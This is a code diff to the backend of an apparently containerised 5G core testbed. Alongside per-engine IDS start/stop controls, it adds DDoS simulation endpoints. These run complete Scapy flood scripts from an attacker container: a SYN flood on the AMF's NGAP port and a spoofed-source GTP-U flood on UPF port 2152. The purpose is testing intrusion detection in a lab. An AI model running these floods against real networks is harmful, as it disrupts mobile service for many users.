@@ -902,10 +902,12 @@ app.get('/ids/stats', (req, res) => {
   res.json({ total: alerts.length, bySeverity: bySev, byType });
 });
 
-// POST /ids/start — start both IDS engines
+// POST /ids/start — start IDS engine(s); optional body { engine: 'zeek-ids' | 'scapy-ids' }
 app.post('/ids/start', async (req, res) => {
+  const { engine } = req.body || {};
+  const targets = engine ? IDS_ENGINES.filter(e => e.id === engine) : IDS_ENGINES;
   const results = [];
-  for (const { id, container } of IDS_ENGINES) {
+  for (const { id, container } of targets) {
     try {
       await docker.getContainer(container).start();
       results.push({ id, status: 'started' });
@@ -917,10 +919,12 @@ app.post('/ids/start', async (req, res) => {
   res.json({ results });
 });
 
-// POST /ids/stop — stop both IDS engines
+// POST /ids/stop — stop IDS engine(s); optional body { engine: 'zeek-ids' | 'scapy-ids' }
 app.post('/ids/stop', async (req, res) => {
+  const { engine } = req.body || {};
+  const targets = engine ? IDS_ENGINES.filter(e => e.id === engine) : IDS_ENGINES;
   const results = [];
-  for (const { id, container } of IDS_ENGINES) {
+  for (const { id, container } of targets) {
     try {
       await docker.getContainer(container).stop({ t: 5 });
       results.push({ id, status: 'stopped' });
@@ -940,6 +944,216 @@ app.delete('/ids/alerts', (req, res) => {
     res.json({ cleared: true });
   } catch (err) {
     res.status(500).json({ error: err.message });
+  }
+});
+
+// ═══════════════════════════════════════════════════════════
+// DDoS ATTACK SIMULATION — control-plane (NGAP) + data-plane (GTP-U)
+// Runs Python/Scapy attack scripts inside the 5g-scapy-attacker container
+// ═══════════════════════════════════════════════════════════
+
+const ATTACKER_CONTAINER  = '5g-scapy-attacker';
+const ATTACKER_RAN_IP     = '192.168.70.91';   // ran-net IP (UE-side source)
+const ATTACKER_INTERNET_IP = '1.2.3.4';         // spoofed internet source IP
+
+// Control-plane attack: NGAP SYN flood toward AMF N2 (port 38412)
+const ATTACK_CP_SCRIPT = [
+  'import sys,time,os',
+  'from scapy.all import IP,TCP,send,conf',
+  'conf.verb=0',
+  'burst=int(sys.argv[1]);dur=float(sys.argv[2])*60;wait=float(sys.argv[3]);tgt=sys.argv[4]',
+  "open('/tmp/atk.pid','w').write(str(os.getpid()))",
+  'n=0;end=time.time()+dur',
+  'try:',
+  '    while time.time()<end:',
+  '        n+=1;send([IP(dst=tgt)/TCP(dport=38412,flags="S") for _ in range(burst)])',
+  "        print('burst '+str(n)+': '+str(burst)+' NGAP SYN -> '+tgt+':38412',flush=True)",
+  '        time.sleep(wait)',
+  "except Exception as e:print('err: '+str(e),flush=True)",
+  'finally:',
+  "    try:os.unlink('/tmp/atk.pid')",
+  '    except:pass',
+  "print('DONE',flush=True)",
+].join('\n');
+
+// Data-plane attack: GTP-U flood toward UPF N3 (port 2152)
+const ATTACK_DP_SCRIPT = [
+  'import sys,time,os,random',
+  'from scapy.all import IP,UDP,Raw,send,conf',
+  'conf.verb=0',
+  'burst=int(sys.argv[1]);dur=float(sys.argv[2])*60;wait=float(sys.argv[3]);tgt=sys.argv[4];src=sys.argv[5]',
+  `src_ip='${ATTACKER_RAN_IP}' if src=='ue' else '${ATTACKER_INTERNET_IP}'`,
+  "open('/tmp/atk.pid','w').write(str(os.getpid()))",
+  'n=0;end=time.time()+dur',
+  'try:',
+  '    while time.time()<end:',
+  '        n+=1;pkts=[]',
+  '        for _ in range(burst):',
+  '            teid=random.randint(1,0xffffffff)',
+  '            gtp=bytes([0x30,0xff,0x00,0x08])+teid.to_bytes(4,"big")+bytes([0,0,0,0])',
+  '            pkts.append(IP(src=src_ip,dst=tgt)/UDP(sport=random.randint(1024,65535),dport=2152)/Raw(gtp))',
+  '        send(pkts)',
+  "        print('burst '+str(n)+': '+str(burst)+' GTP-U -> '+tgt+':2152 src:'+src_ip,flush=True)",
+  '        time.sleep(wait)',
+  "except Exception as e:print('err: '+str(e),flush=True)",
+  'finally:',
+  "    try:os.unlink('/tmp/atk.pid')",
+  '    except:pass',
+  "print('DONE',flush=True)",
+].join('\n');
+
+// In-memory attack tracking
+let activeAttack = null;
+
+// Helper: get primary IP of a container on a given network (or first network)
+async function getContainerIp(containerName, preferNetwork = null) {
+  try {
+    const info = await docker.getContainer(containerName).inspect();
+    const nets = info.NetworkSettings.Networks || {};
+    if (preferNetwork && nets[preferNetwork]) return nets[preferNetwork].IPAddress;
+    const first = Object.values(nets).find(n => n.IPAddress);
+    return first ? first.IPAddress : null;
+  } catch { return null; }
+}
+
+// GET /ddos/upfs — list UPF containers with their IPs (for data-plane target selection)
+app.get('/ddos/upfs', async (req, res) => {
+  try {
+    const containers = await docker.listContainers({ all: true });
+    const upfContainers = containers.filter(c =>
+      c.Labels?.['com.5g-testbed.type'] === '5gc-up' ||
+      (c.Names || []).some(n => /upf/i.test(n))
+    );
+    const upfs = await Promise.all(upfContainers.map(async c => {
+      const name = c.Names[0].replace('/', '');
+      const ips = {};
+      try {
+        const info = await docker.getContainer(name).inspect();
+        const nets = info.NetworkSettings.Networks || {};
+        for (const [netName, netInfo] of Object.entries(nets)) {
+          if (netInfo.IPAddress) ips[netName] = netInfo.IPAddress;
+        }
+      } catch {}
+      return {
+        containerName: name,
+        label: c.Labels?.['com.5g-testbed.nf'] || name,
+        running: c.State === 'running',
+        ips,
+        primaryIp: Object.values(ips)[0] || null,
+      };
+    }));
+    res.json(upfs);
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// GET /ddos/status — current attack state
+app.get('/ddos/status', async (req, res) => {
+  // Auto-expire if duration elapsed
+  if (activeAttack && Date.now() > activeAttack.endTime) activeAttack = null;
+
+  // Also check attacker container readiness
+  let attackerReady = false;
+  try {
+    const info = await docker.getContainer(ATTACKER_CONTAINER).inspect();
+    attackerReady = info.State.Running;
+  } catch {}
+
+  res.json({
+    running:      !!activeAttack,
+    attackerReady,
+    attack:       activeAttack || null,
+  });
+});
+
+// POST /ddos/start — launch a DDoS attack burst in the attacker container
+// Body: { plane, burstSize, duration, waitSecs, targetContainer, source }
+app.post('/ddos/start', async (req, res) => {
+  if (activeAttack && Date.now() < activeAttack.endTime)
+    return res.status(409).json({ error: 'Attack already running — stop it first' });
+
+  const {
+    plane         = 'control',
+    burstSize     = 4,
+    duration      = 1,
+    waitSecs      = 5,
+    targetContainer,   // data plane only: UPF container name
+    source        = 'ue',
+  } = req.body || {};
+
+  if (!['control', 'data'].includes(plane))
+    return res.status(400).json({ error: 'plane must be "control" or "data"' });
+  if (plane === 'data' && !targetContainer)
+    return res.status(400).json({ error: 'targetContainer required for data plane attack' });
+
+  // Verify attacker container is running
+  let attacker;
+  try {
+    attacker = docker.getContainer(ATTACKER_CONTAINER);
+    const info = await attacker.inspect();
+    if (!info.State.Running)
+      return res.status(503).json({ error: 'Attacker container is not running. Start IDS stack first (make ids-up).' });
+  } catch {
+    return res.status(503).json({ error: 'Attacker container not found. Run: make ids-up' });
+  }
+
+  // Determine target IP
+  let targetIp;
+  if (plane === 'control') {
+    // Attack AMF N2 NGAP port
+    targetIp = await getContainerIp('open5gs-amf');
+    if (!targetIp) return res.status(503).json({ error: 'Cannot resolve AMF IP' });
+  } else {
+    // Attack selected UPF GTP-U port
+    targetIp = await getContainerIp(targetContainer);
+    if (!targetIp) return res.status(503).json({ error: `Cannot resolve IP for ${targetContainer}` });
+  }
+
+  const script = plane === 'control' ? ATTACK_CP_SCRIPT : ATTACK_DP_SCRIPT;
+  const scriptB64 = Buffer.from(script).toString('base64');
+
+  try {
+    // Write attack script into container
+    await runExec(attacker, ['sh', '-c', `printf '%s' '${scriptB64}' | base64 -d > /tmp/atk.py`], 5000);
+
+    // Launch attack in background (detached exec)
+    const args = [burstSize, duration, waitSecs, targetIp];
+    if (plane === 'data') args.push(source);
+    const exec = await attacker.exec({
+      Cmd: ['python3', '/tmp/atk.py', ...args.map(String)],
+      AttachStdout: false,
+      AttachStderr: false,
+    });
+    await exec.start({ Detach: true });
+
+    activeAttack = {
+      plane,
+      burstSize:  Number(burstSize),
+      duration:   Number(duration),
+      waitSecs:   Number(waitSecs),
+      targetIp,
+      targetContainer: plane === 'data' ? targetContainer : 'open5gs-amf',
+      source:     plane === 'data' ? source : null,
+      startedAt:  new Date().toISOString(),
+      endTime:    Date.now() + Number(duration) * 60 * 1000,
+    };
+
+    res.json({ ok: true, attack: activeAttack });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// POST /ddos/stop — kill the running attack script in the attacker container
+app.post('/ddos/stop', async (req, res) => {
+  activeAttack = null;
+  try {
+    const attacker = docker.getContainer(ATTACKER_CONTAINER);
+    await runExec(attacker, [
+      'sh', '-c',
+      'kill -9 $(cat /tmp/atk.pid 2>/dev/null) 2>/dev/null; rm -f /tmp/atk.pid /tmp/atk.py',
+    ], 5000);
+    res.json({ ok: true });
+  } catch (e) {
+    // Container may not exist or not be running — that's ok, attack is stopped
+    res.json({ ok: true, warning: e.message });
   }
 });
 
